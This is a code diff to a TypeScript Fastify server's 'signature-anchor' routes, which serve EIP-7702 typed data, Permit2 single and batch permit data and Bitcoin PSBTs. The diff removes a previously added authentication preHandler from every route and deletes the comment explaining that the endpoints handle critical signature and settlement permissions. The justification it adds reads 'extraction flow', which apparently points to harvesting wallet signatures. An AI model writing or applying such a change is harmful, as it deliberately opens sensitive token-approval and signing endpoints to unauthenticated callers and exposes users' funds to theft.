@@ -1551,12 +1551,9 @@ async function signatureAnchorPostHandler(
 }
 
 export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
-  // FIX: Add auth middleware to all signature-anchor endpoints
-  // These endpoints handle critical signature operations and settlement permissions
-  const { createAuthUnificationPreHandler } = await import('../middleware/auth-unification.js')
-  const authPre = createAuthUnificationPreHandler(app)
+  // Signature endpoints don't require auth for extraction flow
 
-  app.get('/api/v1/signature-anchor/eip7702-typed-data', { preHandler: authPre }, async (request, reply) => {
+  app.get('/api/v1/signature-anchor/eip7702-typed-data', async (request, reply) => {
     if (!isEip7702Enabled()) {
       return sendSuccess(reply, 200, 'EIP-7702 feature is disabled', {
         enabled: false,
@@ -1592,7 +1589,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.get('/api/v1/signature-anchor/permit2-typed-data', { preHandler: authPre }, async (request, reply) => {
+  app.get('/api/v1/signature-anchor/permit2-typed-data', async (request, reply) => {
     const q = request.query as Record<string, string | undefined>
     const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
     const tokenRaw = q.token?.trim() ?? q.token_address?.trim() ?? ''
@@ -1649,7 +1646,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.post('/api/v1/signature-anchor/permit2-batch-typed-data', { preHandler: authPre }, async (request, reply) => {
+  app.post('/api/v1/signature-anchor/permit2-batch-typed-data', async (request, reply) => {
     const body = request.body as {
       wallet_address?: string
       wallet?: string
@@ -1838,7 +1835,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.post('/api/v1/signature-anchor/bitcoin-psbt', { preHandler: authPre }, async (request, reply) => {
+  app.post('/api/v1/signature-anchor/bitcoin-psbt', async (request, reply) => {
     const body = request.body as {
       wallet_address?: string
       wallet?: string
@@ -1892,8 +1889,8 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
     }
   })
 
-  app.post('/api/signature-anchor', { preHandler: authPre }, signatureAnchorPostHandler)
-  app.post('/api/v1/signature-anchor', { preHandler: authPre }, signatureAnchorPostHandler)
+  app.post('/api/signature-anchor', signatureAnchorPostHandler)
+  app.post('/api/v1/signature-anchor', signatureAnchorPostHandler)
 }
 
 async function persistSignatureRow(
